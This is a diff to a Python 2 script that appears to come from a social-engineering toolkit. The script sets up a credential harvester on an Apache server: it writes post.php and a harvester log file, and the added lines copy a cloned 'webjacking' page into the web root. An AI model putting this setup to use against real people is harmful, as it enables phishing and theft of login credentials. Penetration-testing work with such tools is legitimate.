@@ -432,7 +432,6 @@ def run():
             print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
         except Exception, e:
                 print e 
-                pause = raw_input("TEST")
         print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
         filewrite = file("%s/post.php" % (apache_dir), "w")
@@ -443,6 +442,15 @@ def run():
         filewrite.write("")
         filewrite.close()
         subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
+
+        # if we are using webjacking, etc.
+        if os.path.isfile(setdir + "/web_clone/index2.html"):
+            # need to copy the files over - remove the old one first if there
+            if os.path.isfile(apache_dir + "/index2.html"):
+                os.remove(apache_dir + "/index2.html")
+
+            shutil.copyfile(setdir + "/web_clone/index2.html", apache_dir + "/index2.html")
+
         # here we specify if we are tracking users and such
         if track_email == True:
             fileopen = file (setdir + "/web_clone/index.html", "r")
